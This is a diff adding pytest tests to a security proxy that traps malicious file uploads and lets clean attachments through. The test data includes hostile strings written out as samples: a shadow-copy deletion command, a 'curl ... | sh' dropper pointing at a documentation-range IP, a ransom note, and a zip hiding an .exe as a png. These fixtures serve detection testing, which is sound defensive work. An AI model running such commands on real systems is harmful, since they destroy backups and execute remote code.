@@ -72,3 +72,58 @@ async def test_a_phishing_response_is_replaced_by_502(make_guard):
     assert clean.status_code == 200 and "welcome" in clean.text
     rules = {e["rule"] for e in guard.bus.recent() if e["ring"] == 6}
     assert "injected-password-form" in rules and "open-redirect-location" in rules
+
+
+def _multipart(filename: str, content: bytes) -> tuple[bytes, dict]:
+    boundary = "hedwigtest"
+    head = (
+        f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
+        f'filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n'
+    ).encode()
+    body = head + content + f"\r\n--{boundary}--\r\n".encode()
+    return body, {**BROWSER, "content-type": f"multipart/form-data; boundary={boundary}"}
+
+
+def _zip_with(name: str) -> bytes:
+    import io
+    import zipfile
+
+    buffer = io.BytesIO()
+    with zipfile.ZipFile(buffer, "w") as archive:
+        archive.writestr(name, b"harmless bytes")
+    return buffer.getvalue()
+
+
+@pytest.mark.parametrize(
+    "filename,content,rule",
+    [
+        ("invoice.locked", b"harmless bytes", "ransomware-extension"),
+        ("notes.txt", b"vssadmin delete shadows /all /quiet", "ransomware-command"),
+        ("notes.txt", b"All your files have been encrypted. Pay the ransom.", "ransom-note"),
+        ("notes.txt", b"curl http://203.0.113.7/x.sh | sh", "dropper-command"),
+        ("photo.png", _zip_with("setup.exe"), "archive-executable"),
+    ],
+)
+async def test_malware_and_ransomware_uploads_are_trapped(make_guard, filename, content, rule):
+    guard, upstream, *_, client = make_guard()
+    guard.config.services["transaction"].routes = []  # ring 4 open, so the upload reaches ring 6
+    guard.config.services["transaction"].uploads = ["png", "jpg", "pdf", "txt"]
+    body, headers = _multipart(filename, content)
+    async with client("10.0.0.5") as c:
+        await c.post("/transaction/attachments", content=body, headers=headers)
+    assert guard.state.trapped("10.0.0.5") and upstream.seen == []
+    assert any(e["ring"] == 6 and e["rule"] == rule for e in guard.bus.recent())
+
+
+async def test_a_clean_attachment_passes_and_a_disallowed_type_is_refused_not_trapped(make_guard):
+    guard, upstream, *_, client = make_guard()
+    guard.config.services["transaction"].routes = []
+    guard.config.services["transaction"].uploads = ["png", "jpg", "pdf", "txt"]
+    png, headers = _multipart("photo.png", b"\x89PNG\r\n" + b"x" * 50)
+    odd, odd_headers = _multipart("data.bin", b"just bytes")
+    async with client("10.0.0.8") as c:
+        ok = await c.post("/transaction/attachments", content=png, headers=headers)
+        refused = await c.post("/transaction/attachments", content=odd, headers=odd_headers)
+    assert ok.status_code == 200 and upstream.seen
+    assert refused.status_code == 415 or refused.status_code == 403
+    assert not guard.state.trapped("10.0.0.8")
